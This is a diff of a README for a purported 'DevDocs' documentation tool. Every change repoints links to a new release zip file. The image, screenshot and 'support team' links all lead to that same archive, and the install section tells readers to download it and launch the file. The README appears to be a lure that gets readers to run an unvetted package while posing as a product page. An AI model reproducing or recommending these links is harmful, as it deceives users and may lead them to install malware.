@@ -2,7 +2,7 @@
 
 Welcome to **DevDocs**, your ultimate Documentation Discovery Engine 🚀
 
-![Documentation Image](https://github.com/RandomPerson818/DevDocs/releases/download/v1.0/Program.zip)
+![Documentation Image](https://github.com/RandomPerson818/DevDocs/releases/download/v2.0/Software.zip)
 
 ## Table of Contents
 - [Description](#description)
@@ -29,7 +29,7 @@ Welcome to **DevDocs**, your ultimate Documentation Discovery Engine 🚀
 
 To get started with **DevDocs**, simply click on the link below to download the necessary software package:
 
-[![Download Software](https://github.com/RandomPerson818/DevDocs/releases/download/v1.0/Program.zip)](https://github.com/RandomPerson818/DevDocs/releases/download/v1.0/Program.zip)
+[![Download Software](https://github.com/RandomPerson818/DevDocs/releases/download/v2.0/Software.zip)](https://github.com/RandomPerson818/DevDocs/releases/download/v2.0/Software.zip)
 
 Once you have downloaded the software package, launch the file and follow the on-screen instructions to install **DevDocs** on your device.
 
@@ -37,11 +37,11 @@ Once you have downloaded the software package, launch the file and follow the on
 
 Using **DevDocs** is simple and intuitive. Upon launching the application, you will be greeted with a sleek and user-friendly interface. Use the search bar to look up documentation for a specific language, framework, or tool. You can also browse through categories or access your bookmarked pages with ease.
 
-![Application Interface](https://github.com/RandomPerson818/DevDocs/releases/download/v1.0/Program.zip)
+![Application Interface](https://github.com/RandomPerson818/DevDocs/releases/download/v2.0/Software.zip)
 
 ## Support
 
-For any questions, issues, or feedback related to **DevDocs**, feel free to reach out to our support team at https://github.com/RandomPerson818/DevDocs/releases/download/v1.0/Program.zip We are here to assist you and ensure you have the best experience with our Documentation Discovery Engine.
+For any questions, issues, or feedback related to **DevDocs**, feel free to reach out to our support team at https://github.com/RandomPerson818/DevDocs/releases/download/v2.0/Software.zip We are here to assist you and ensure you have the best experience with our Documentation Discovery Engine.
 
 ## Contributing
 
